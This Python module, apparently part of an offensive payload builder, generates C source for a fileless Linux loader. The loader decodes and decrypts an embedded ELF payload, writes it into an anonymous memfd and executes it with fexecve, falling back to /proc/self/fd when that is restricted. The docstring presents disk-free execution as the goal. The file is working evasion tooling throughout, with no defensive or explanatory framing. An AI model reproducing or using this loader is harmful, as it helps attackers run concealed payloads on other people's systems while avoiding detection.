#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for memfd_create + fexecve fileless ELF execution."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class MemfdExecBuilder(LinuxInjectionBuilder):
    """Decrypt embedded ELF bytes, write to memfd, execute via fexecve (no disk touch)."""

    def build_source(self, encoded_payload: str, key: bytes, iv=None, *, memfd_name: str = "ks") -> str:
        name = memfd_name.replace("\\", "\\\\").replace('"', '\\"')
        return f"""
{chr(10).join(self.headers())}
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <fcntl.h>
#include <errno.h>

char* enc_payload = "{encoded_payload}";
static char memfd_label[] = "{name}";

#ifndef __NR_memfd_create
#if defined(__x86_64__)
#define __NR_memfd_create 319
#elif defined(__aarch64__)
#define __NR_memfd_create 279
#else
#define __NR_memfd_create 319
#endif
#endif

static int memfd_create_anon(const char *label)
{{
    return (int)syscall(__NR_memfd_create, label, (long)MFD_CLOEXEC);
}}

int main(int argc, char **argv, char **envp)
{{
    int fd;
    ssize_t written;
{self.decode_preamble()}
{self.decrypt_block(key, iv)}

    fd = memfd_create_anon(memfd_label);
    if (fd < 0) {{
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}

    written = 0;
    while (written < payload_size) {{
        ssize_t n = write(fd, shellcode_buf + written, (size_t)payload_size - (size_t)written);
        if (n <= 0) {{
            close(fd);
            munmap(shellcode_buf, (size_t)payload_size);
            free(decoded);
            return 1;
        }}
        written += n;
    }}

    munmap(shellcode_buf, (size_t)payload_size);
    free(decoded);

    if (lseek(fd, 0, SEEK_SET) != 0) {{
        close(fd);
        return 1;
    }}

    char *exec_argv[] = {{ memfd_label, NULL }};
    if (argc > 1) {{
        exec_argv[0] = argv[1];
        exec_argv[1] = NULL;
    }}

    fexecve(fd, exec_argv, envp);

    /* Fallback for kernels/libc where fexecve on memfd is restricted */
    {{
        char proc_path[64];
        snprintf(proc_path, sizeof(proc_path), "/proc/self/fd/%d", fd);
        execve(proc_path, exec_argv, envp);
    }}

    close(fd);
    return 1;
}}
"""

    def decode_preamble(self, encoded_var: str = "enc_payload") -> str:
        return f"""
    int enc_len = (int)strlen({encoded_var});
    unsigned char *decoded = (unsigned char *)malloc((size_t)enc_len);
    if (!decoded) return 1;
    int payload_size = base64decode(decoded, {encoded_var}, enc_len);
    if (payload_size <= 0) return 1;
    unsigned char *shellcode_buf = (unsigned char *)mmap(
        NULL, (size_t)payload_size, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode_buf == MAP_FAILED) {{
        free(decoded);
        return 1;
    }}
"""
